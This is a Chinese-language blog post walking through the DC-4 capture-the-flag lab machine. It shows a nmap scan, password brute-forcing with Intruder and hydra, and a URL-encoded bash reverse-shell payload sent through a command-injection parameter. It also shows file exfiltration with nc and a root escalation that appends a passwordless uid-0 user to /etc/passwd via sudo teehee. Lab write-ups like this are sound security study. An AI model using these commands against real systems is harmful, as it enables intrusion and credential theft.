<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="noindex, nofollow">
<title>Vulhub DC4 靶场 | w8nn9z Blog</title>
<meta name="keywords" content="">
<meta name="description" content="Vulhub DC4 靶场 - w8nn9z Blog">
<meta name="author" content="">
<link rel="canonical" href="http://localhost:1313/posts/penetration/vulhubdc4/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css" integrity="sha256-EqVinQvl&#43;IX9lG13JX5V90An7So1FEop4tsT&#43;PYrXzU=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/penetration/vulhubdc4/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/search" title="搜索 (Alt &#43; /)" accesskey=/>
                    <span>搜索</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/posts" title="文章">
                    <span>文章</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/archives" title="归档">
                    <span>归档</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/about" title="关于">
                    <span>关于</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      Vulhub DC4 靶场
    </h1>
    <div class="post-meta"><span title='2025-09-23 00:00:00 +0000 UTC'>September 23, 2025</span>

</div>
  </header> 

  <div class="post-content"><p>nmap扫描开放端口及服务：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap 61.139.2.0/24
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 61.139.2.133
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00052s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
</span></span><span style="display:flex;"><span>22/tcp open  ssh
</span></span><span style="display:flex;"><span>80/tcp open  http
</span></span></code></pre></div><p>22端口开启了ssh服务，80端口开启了http服务，先访问http服务：</p>
<p><img alt="alt" loading="lazy" src="/images/Vulhub/1.png"></p>
<p>kali没安装FoxyProxy插件，用NAT模式配置端口映射使主机访问：<code>编辑-&gt;虚拟网络编辑器-&gt;NAT设置-&gt;添加-&gt;设置主机端口以及要访问的虚拟机Web服务ip端口</code>，Intruder爆破出密码为happy</p>
<p>radio参数可控，可以实现RCE，kali监听2333端口，尝试反弹shell：</p>
<pre tabindex="0"><code>radio=bash+-c+&#39;bash+-i+&gt;%26+/dev/tcp/61.139.2.128/2333+0&gt;%261&#39;&amp;submit=Run
</code></pre><p>反弹shell成功，当前用户为<code>www-data</code>：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lvnp <span style="color:#ae81ff">2333</span>            
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">2333</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>61.139.2.128<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>61.139.2.133<span style="color:#f92672">]</span> <span style="color:#ae81ff">54614</span>
</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>459<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
</span></span><span style="display:flex;"><span>bash: no job control in this shell
</span></span><span style="display:flex;"><span>www-data@dc-4:/usr/share/nginx/html$ 
</span></span></code></pre></div><p>先获取敏感文件信息，比如<code>/etc/passwd</code>，该文件只有root可写：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
</span></span><span style="display:flex;"><span>systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
</span></span><span style="display:flex;"><span>systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
</span></span><span style="display:flex;"><span>systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
</span></span><span style="display:flex;"><span>_apt:x:104:65534::/nonexistent:/bin/false
</span></span><span style="display:flex;"><span>messagebus:x:105:109::/var/run/dbus:/bin/false
</span></span><span style="display:flex;"><span>sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>nginx:x:107:111:nginx user,,,:/nonexistent:/bin/false
</span></span><span style="display:flex;"><span>charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash
</span></span><span style="display:flex;"><span>jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash
</span></span><span style="display:flex;"><span>sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash
</span></span><span style="display:flex;"><span>Debian-exim:x:108:112::/var/spool/exim4:/bin/false
</span></span></code></pre></div><p><code>/home</code>目录下有三个用户<code>charles, jim, sam</code>，在<code>/home/jim/backups</code>目录下发现备份文件<code>old-passwords.bak</code>，可能是ssh用户密码，先用nc将密码字典传到kali上：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali:$ nc -lvnp <span style="color:#ae81ff">2444</span> &gt; passwords.txt
</span></span><span style="display:flex;"><span>target:$ nc 61.139.2.128 <span style="color:#ae81ff">2444</span> &lt; /home/jim/backups/old-passwords.bak
</span></span></code></pre></div><p>再写一个username.txt：</p>
<pre tabindex="0"><code>jim
sam
charles
</code></pre><p>爆破ssh用户名和密码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ hydra -L username.txt -P passwords.txt ssh://61.139.2.133 -vV
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 61.139.2.133   login: jim   password: jibril04
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>用ssh登录jim用户：</p>
<pre tabindex="0"><code>ssh jim@61.139.2.133 -p 22
</code></pre><p>查看mbox文件内容：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>From root@dc-4 Sat Apr <span style="color:#ae81ff">06</span> 20:20:04 <span style="color:#ae81ff">2019</span>
</span></span><span style="display:flex;"><span>Return-path: &lt;root@dc-4&gt;
</span></span><span style="display:flex;"><span>Envelope-to: jim@dc-4
</span></span><span style="display:flex;"><span>Delivery-date: Sat, <span style="color:#ae81ff">06</span> Apr <span style="color:#ae81ff">2019</span> 20:20:04 +1000
</span></span><span style="display:flex;"><span>Received: from root by dc-4 with local <span style="color:#f92672">(</span>Exim 4.89<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">(</span>envelope-from &lt;root@dc-4&gt;<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>        id 1hCiQe-0000gc-EC
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> jim@dc-4; Sat, <span style="color:#ae81ff">06</span> Apr <span style="color:#ae81ff">2019</span> 20:20:04 +1000
</span></span><span style="display:flex;"><span>To: jim@dc-4
</span></span><span style="display:flex;"><span>Subject: Test
</span></span><span style="display:flex;"><span>MIME-Version: 1.0
</span></span><span style="display:flex;"><span>Content-Type: text/plain; charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>
</span></span><span style="display:flex;"><span>Content-Transfer-Encoding: 8bit
</span></span><span style="display:flex;"><span>Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;
</span></span><span style="display:flex;"><span>From: root &lt;root@dc-4&gt;
</span></span><span style="display:flex;"><span>Date: Sat, <span style="color:#ae81ff">06</span> Apr <span style="color:#ae81ff">2019</span> 20:20:04 +1000
</span></span><span style="display:flex;"><span>Status: RO
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>This is a test.
</span></span></code></pre></div><p>看起来像一封mail，查看<code>/var/mail</code>目录，发现存在jim文件：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>From charles@dc-4 Sat Apr <span style="color:#ae81ff">06</span> 21:15:46 <span style="color:#ae81ff">2019</span>
</span></span><span style="display:flex;"><span>Return-path: &lt;charles@dc-4&gt;
</span></span><span style="display:flex;"><span>Envelope-to: jim@dc-4
</span></span><span style="display:flex;"><span>Delivery-date: Sat, <span style="color:#ae81ff">06</span> Apr <span style="color:#ae81ff">2019</span> 21:15:46 +1000
</span></span><span style="display:flex;"><span>Received: from charles by dc-4 with local <span style="color:#f92672">(</span>Exim 4.89<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">(</span>envelope-from &lt;charles@dc-4&gt;<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>        id 1hCjIX-0000kO-Qt
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> jim@dc-4; Sat, <span style="color:#ae81ff">06</span> Apr <span style="color:#ae81ff">2019</span> 21:15:45 +1000
</span></span><span style="display:flex;"><span>To: jim@dc-4
</span></span><span style="display:flex;"><span>Subject: Holidays
</span></span><span style="display:flex;"><span>MIME-Version: 1.0
</span></span><span style="display:flex;"><span>Content-Type: text/plain; charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>
</span></span><span style="display:flex;"><span>Content-Transfer-Encoding: 8bit
</span></span><span style="display:flex;"><span>Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;
</span></span><span style="display:flex;"><span>From: Charles &lt;charles@dc-4&gt;
</span></span><span style="display:flex;"><span>Date: Sat, <span style="color:#ae81ff">06</span> Apr <span style="color:#ae81ff">2019</span> 21:15:45 +1000
</span></span><span style="display:flex;"><span>Status: O
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Hi Jim,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>I<span style="color:#960050;background-color:#1e0010">&#39;</span>m heading off on holidays at the end of today, so the boss asked me to give you my password just in <span style="color:#66d9ef">case</span> anything goes wrong.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Password is:  ^xHhA&amp;hvim0y
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>See ya,
</span></span><span style="display:flex;"><span>Charles
</span></span></code></pre></div><p>获得了Charles的ssh密码，查看是否存在可用的sudo命令：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo -l
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> charles on dc-4:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User charles may run the following commands on dc-4:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/teehee
</span></span><span style="display:flex;"><span>charles@dc-4:~$ ls /usr/bin/teehee -al
</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">38740</span> Apr  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2019</span> /usr/bin/teehee
</span></span></code></pre></div><p>teehee提权，往<code>/etc/passwd</code>写入一个uid为0的无密码的用户：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ echo <span style="color:#e6db74">&#34;test::0:0:::/bin/bash&#34;</span> | sudo teehee -a /etc/passwd
</span></span><span style="display:flex;"><span>test::0:0:::/bin/bash
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ su test
</span></span><span style="display:flex;"><span>root@dc-4:/home/charles# 
</span></span></code></pre></div><p>最后查看<code>/root</code>目录下文件，获取<code>/root/flag.txt</code>文件内容：</p>
<pre tabindex="0"><code>


888       888          888 888      8888888b.                             888 888 888 888 
888   o   888          888 888      888  &#34;Y88b                            888 888 888 888 
888  d8b  888          888 888      888    888                            888 888 888 888 
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
888d88888b888 d8P  Y8b 888 888      888    888 d88&#34;&#34;88b 888 &#34;88b d8P  Y8b 888 888 888 888 
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &#34;   &#34;   &#34;   &#34;  
888P     Y888  &#34;Y8888  888 888      8888888P&#34;   &#34;Y88P&#34;  888  888  &#34;Y8888  888 888 888 888 


Congratulations!!!

Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
</code></pre><p>参考资料：</p>
<p><a href="https://www.cnblogs.com/zlgxzswjy/p/16118468.html">https://www.cnblogs.com/zlgxzswjy/p/16118468.html</a></p>
<p><a href="https://developer.aliyun.com/article/1489918">https://developer.aliyun.com/article/1489918</a></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="http://localhost:1313/">w8nn9z Blog</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
